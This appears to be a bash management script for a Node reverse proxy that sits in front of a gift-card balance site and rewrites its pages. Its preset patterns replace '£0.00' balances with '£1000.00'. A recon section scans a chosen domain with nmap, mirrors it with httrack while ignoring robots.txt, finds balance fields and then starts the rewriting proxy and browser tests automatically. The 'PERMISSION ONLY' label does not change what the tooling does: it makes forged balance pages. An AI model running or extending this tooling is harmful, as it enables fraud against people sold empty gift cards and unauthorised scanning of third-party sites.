#!/usr/bin/env bash
set -euo pipefail

ROOT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")"/.. && pwd)"
PID_FILE="$ROOT_DIR/.proxy.pid"
LOG_FILE="$ROOT_DIR/.proxy.log"
PID_FILE_MOCK="$ROOT_DIR/.mock.pid"
LOG_FILE_MOCK="$ROOT_DIR/.mock.log"

usage() {
  cat <<EOF
Usage: $(basename "$0") <command>

Commands:
  install           Install Node deps (app + test browsers)
  start             Start proxy-server (background)
  start:server      Start server.js (background)
  start:mock        Start mock upstream server on 8081 (background)
  start:stack       Start mock upstream then proxy with TARGET pointing to mock
  stop              Stop background process
  stop:all          Stop all background processes
  restart           Restart proxy-server
  status            Show process status
  logs              Tail logs
  test:playwright   Run Playwright e2e hitting proxy
  test:selenium     Run Selenium e2e hitting proxy

Domain / Recon (PERMISSION ONLY):
  domain:scan <domain>        Basic nmap reachability + top ports (80,443)
  domain:mirror <domain>      Mirror site with httrack into mirror/<domain>
  domain:analyze <domain>     Analyze mirrored HTML for candidate patterns
  domain:prep                 Interactive: scan + mirror + analyze + choose path/pattern + optional run tests

Environment:
  TARGET            Upstream target (default: https://tsuk.claim.cards)
  PROXY_PATH        Path prefix to proxy (default: /cardInfo)
  REWRITE_FIND / REWRITE_REPLACE / REWRITE_IS_REGEX=1
  BALANCE_FROM / BALANCE_TO  Simple string rewrites
  NMAP_PORTS        Comma list (default: 80,443)
  NMAP_OPTS         Extra flags appended to nmap (default: -Pn)
  HTTRACK_DEPTH     Mirror depth (default: 3)
  CI=1              Non-interactive domain:prep mode
  RUN_TESTS=1       In CI mode, run tests after starting proxy
  DOMAIN            Domain for CI domain:prep
EOF
}

run_with_timeout() {
  # Usage: run_with_timeout <seconds> <command> [args...]
  local timeout="$1"; shift
  "$@" &
  local pid=$!
  (
    sleep "$timeout"
    if kill -0 "$pid" 2>/dev/null; then
      echo "Timeout ${timeout}s exceeded for: $*; killing PID $pid"
      kill "$pid" 2>/dev/null || true
      sleep 2
      kill -9 "$pid" 2>/dev/null || true
      # Propagate timeout exit code 124 via subshell exit; caller sees child exit
    fi
  ) &
  local watcher=$!
  wait "$pid"
  local exit_code=$?
  kill "$watcher" 2>/dev/null || true
  return "$exit_code"
}

ensure_node() { command -v node >/dev/null || { echo "Node.js is required"; exit 1; }; command -v npm >/dev/null || { echo "npm is required"; exit 1; }; }

install() { ensure_node; (cd "$ROOT_DIR" && npm install); npx -y playwright install --with-deps || true; }

start() {
  ensure_node
  if [[ -f "$PID_FILE" ]] && kill -0 "$(cat "$PID_FILE")" 2>/dev/null; then echo "Already running with PID $(cat "$PID_FILE")"; exit 0; fi
  : >"$LOG_FILE"
  echo "Starting proxy-server.js (TARGET=${TARGET:-https://tsuk.claim.cards} PROXY_PATH=${PROXY_PATH:-/cardInfo})..."
  (cd "$ROOT_DIR" && TARGET="${TARGET:-}" PROXY_PATH="${PROXY_PATH:-/cardInfo}" nohup node proxy-server.js >>"$LOG_FILE" 2>&1 & echo $! >"$PID_FILE")
  sleep 0.8; status
}

start_server() { ensure_node; : >"$LOG_FILE.server"; echo "Starting server.js..."; (cd "$ROOT_DIR" && nohup node server.js >>"$LOG_FILE.server" 2>&1 & echo $! >"$PID_FILE.server"); sleep 0.8; if kill -0 "$(cat "$PID_FILE.server")" 2>/dev/null; then echo "server.js running PID $(cat "$PID_FILE.server")"; else echo "server.js failed to start. See $LOG_FILE.server"; fi; }

start_mock() { ensure_node; : >"$LOG_FILE_MOCK"; echo "Starting mock upstream on 8081..."; (cd "$ROOT_DIR" && nohup node scripts/mock-upstream.js >>"$LOG_FILE_MOCK" 2>&1 & echo $! >"$PID_FILE_MOCK"); sleep 0.6; kill -0 "$(cat "$PID_FILE_MOCK" 2>/dev/null || echo 0)" 2>/dev/null && echo ".mock.pid running PID $(cat "$PID_FILE_MOCK")" || echo "Mock failed to start. See $LOG_FILE_MOCK"; }

start_stack() { start_mock; TARGET="http://localhost:8081" start; }

stop() { for f in "$PID_FILE" "$PID_FILE.server" "$PID_FILE_MOCK"; do if [[ -f "$f" ]]; then if kill -0 "$(cat "$f")" 2>/dev/null; then kill "$(cat "$f")" || true; rm -f "$f"; echo "Stopped $(basename "$f")"; else rm -f "$f"; fi; fi; done; }

status() { for f in "$PID_FILE" "$PID_FILE.server" "$PID_FILE_MOCK"; do if [[ -f "$f" ]] && kill -0 "$(cat "$f")" 2>/dev/null; then echo "$(basename "$f") running: PID $(cat "$f")"; else echo "$(basename "$f") not running"; fi; done; }

logs() { tail -n 200 -f "$LOG_FILE" "$LOG_FILE.server" "$LOG_FILE_MOCK" 2>/dev/null || tail -n 200 -f "$LOG_FILE" 2>/dev/null || true; }

test_playwright() { ensure_node; run_with_timeout "${TEST_TIMEOUT:-60}" node scripts/playwright.test.js; }

test_selenium() { ensure_node; run_with_timeout "${TEST_TIMEOUT:-60}" node scripts/selenium.test.js; }

test_all() { echo "Running Playwright test..."; test_playwright || exit $?; echo "Waiting 3s before Selenium..."; sleep 3; echo "Running Selenium test..."; test_selenium || exit $?; }

# --- Domain Recon / Automation ---
require_tool() { local bin="$1" hint="$2"; if ! command -v "$bin" >/dev/null 2>&1; then echo "Missing required tool: $bin. $hint" >&2; return 1; fi; }

timestamp() { date '+%Y%m%d-%H%M%S'; }

NMAP_PORTS_DEFAULT="80,443"
NMAP_PORTS="${NMAP_PORTS:-$NMAP_PORTS_DEFAULT}"
NMAP_OPTS="${NMAP_OPTS:--Pn}"
HTTRACK_DEPTH="${HTTRACK_DEPTH:-3}"

print_ci_note() { [[ "${CI:-0}" == "1" ]] && echo "[CI mode] $*" || true; }

domain_scan() { local domain="$1"; [[ -z "$domain" ]] && { echo "domain required"; return 1; }; require_tool nmap "Install: brew install nmap" || return 1; echo "== nmap scan for $domain (${NMAP_PORTS}) =="; nmap $NMAP_OPTS -p "$NMAP_PORTS" --open "$domain" || true; }

domain_mirror() { local domain="$1"; [[ -z "$domain" ]] && { echo "domain required"; return 1; }; require_tool httrack "Install: brew install httrack" || return 1; local out="$ROOT_DIR/mirror/$domain"; mkdir -p "$out"; echo "== httrack mirror depth=$HTTRACK_DEPTH $domain -> $out =="; httrack "https://$domain" -O "$out" "+*.$domain/*" "+https://$domain/*" --depth="$HTTRACK_DEPTH" --robots=0 --sockets=2 --keep-alive -v || true; }

domain_analyze() { local domain="$1"; [[ -z "$domain" ]] && { echo "domain required"; return 1; }; node "$ROOT_DIR/scripts/mirror-analyze.js" "$domain"; }

select_pattern() {
  if [[ "${CI:-0}" == "1" ]]; then print_ci_note "Skipping interactive pattern selection"; return 0; fi
  echo "Choose rewrite pattern type:"; local options=("currencyCall->override" "zeroBalanceGBP->£1000.00" "balanceWord->BALANCE_REPLACED" "giftCard->GIFT_CARD" "custom"); local idx=1; for o in "${options[@]}"; do echo "  $idx) $o"; ((idx++)); done; read -r choice; case "$choice" in
    1) REWRITE_FIND="formatCurrency('GBP', '£', '0.00', '{2}{3}')"; REWRITE_REPLACE="formatCurrency('GBP', '£', '1000.00', '{2}{3}')"; REWRITE_IS_REGEX=0 ;;
    2) BALANCE_FROM="£0.00"; BALANCE_TO="£1000.00" ;;
    3) REWRITE_FIND="balance"; REWRITE_REPLACE="BALANCE_REPLACED"; REWRITE_IS_REGEX=0 ;;
    4) REWRITE_FIND="gift card"; REWRITE_REPLACE="GIFT_CARD"; REWRITE_IS_REGEX=0 ;;
    5) echo "Enter literal / regex (without slashes) to find:"; read -r REWRITE_FIND; echo "Enter replacement:"; read -r REWRITE_REPLACE; echo "Regex? (y/N)"; read -r rx; [[ "$rx" =~ ^[Yy]$ ]] && REWRITE_IS_REGEX=1 || REWRITE_IS_REGEX=0 ;;
    *) echo "No pattern selected" ;;
  esac
}

domain_prep() {
  local domainInput
  if [[ "${CI:-0}" == "1" ]]; then
    domainInput="${DOMAIN:-}"; [[ -z "$domainInput" ]] && { echo "CI=1 requires DOMAIN"; return 1; }
  else
    echo "Enter domain (no scheme):"; read -r domainInput; [[ -z "$domainInput" ]] && { echo "No domain"; return 1; }
  fi
  local start_ts=$(timestamp); mkdir -p "$ROOT_DIR/reports";
  echo "-- Step: scan"; domain_scan "$domainInput" | tee "/tmp/scan.$start_ts.log" >/dev/null || true
  echo "-- Step: mirror"; domain_mirror "$domainInput" >/dev/null 2>&1 || true
  echo "-- Step: analyze"; local analysis=$(domain_analyze "$domainInput")
  echo "$analysis" | jq . >/dev/null 2>&1 || analysis=$(echo "$analysis")
  local candidatePathExtract=$(echo "$analysis" | grep -E '"candidatePath"' | sed -E 's/.*"candidatePath": "?([^",}]+).*/\1/' | tr -d '"')
  if [[ "${CI:-0}" == "1" ]]; then
    candidatePath="${PROXY_PATH:-${candidatePathExtract:-/cardInfo}}"
  else
    echo "Suggested path: ${candidatePathExtract:-/cardInfo}"; echo "Use suggested path? (Y/n)"; read -r ans; if [[ "$ans" =~ ^[Nn]$ ]]; then echo "Enter path (start with /):"; read -r candidatePath; else candidatePath="$candidatePathExtract"; fi
  fi
  [[ -z "${candidatePath:-}" ]] && candidatePath="/cardInfo"
  select_pattern
  local startProxy=0 runTests=0
  if [[ "${CI:-0}" == "1" ]]; then
    startProxy=1; [[ "${RUN_TESTS:-0}" == "1" ]] && runTests=1
  else
    echo "Start proxy stack now? (y/N)"; read -r sp; [[ "$sp" =~ ^[Yy]$ ]] && startProxy=1
    echo "Run tests now? (y/N)"; read -r rt; [[ "$rt" =~ ^[Yy]$ ]] && runTests=1
  fi
  if [[ $startProxy -eq 1 ]]; then
    TARGET="https://$domainInput" PROXY_PATH="$candidatePath" REWRITE_FIND="${REWRITE_FIND:-}" REWRITE_REPLACE="${REWRITE_REPLACE:-}" REWRITE_IS_REGEX="${REWRITE_IS_REGEX:-0}" BALANCE_FROM="${BALANCE_FROM:-}" BALANCE_TO="${BALANCE_TO:-}" start
  fi
  local testResult="skipped"
  if [[ $runTests -eq 1 ]]; then
    if SKIP_LANDING=1 PROXY="http://localhost:8080" TEST_TIMEOUT=60 TARGET="https://$domainInput" PROXY_PATH="$candidatePath" REWRITE_FIND="${REWRITE_FIND:-}" REWRITE_REPLACE="${REWRITE_REPLACE:-}" REWRITE_IS_REGEX="${REWRITE_IS_REGEX:-0}" BALANCE_FROM="${BALANCE_FROM:-}" BALANCE_TO="${BALANCE_TO:-}" test_all; then
      testResult="passed"
    else
      testResult="failed"
    fi
  fi
  local reportFile="$ROOT_DIR/reports/${domainInput//[^A-Za-z0-9_.-]/_}-$start_ts.json"
  cat > "$reportFile" <<JSON
{
  "domain": "$domainInput",
  "timestamp": "$start_ts",
  "candidatePath": "$candidatePath",
  "rewrite": {
    "find": "${REWRITE_FIND:-}",
    "replace": "${REWRITE_REPLACE:-}",
    "isRegex": "${REWRITE_IS_REGEX:-0}",
    "balanceFrom": "${BALANCE_FROM:-}",
    "balanceTo": "${BALANCE_TO:-}"
  },
  "analysis": $analysis,
  "testResult": "$testResult"
}
JSON
  echo "Report: $reportFile"
}

cmd="${1:-}"; shift || true
case "$cmd" in
  install) install ;;
  start) start ;;
  start:server) start_server ;;
  start:mock) start_mock ;;
  start:stack) start_stack ;;
  stop) stop ;;
  stop:all) stop ;;
  restart) stop; start ;;
  status) status ;;
  logs) logs ;;
  test:playwright) test_playwright ;;
  test:selenium) test_selenium ;;
  test:all) test_all ;;
  domain:scan) domain_scan "${1:-}" ;;
  domain:mirror) domain_mirror "${1:-}" ;;
  domain:analyze) domain_analyze "${1:-}" ;;
  domain:prep) domain_prep ;;
  *) usage; exit 1 ;;

esac
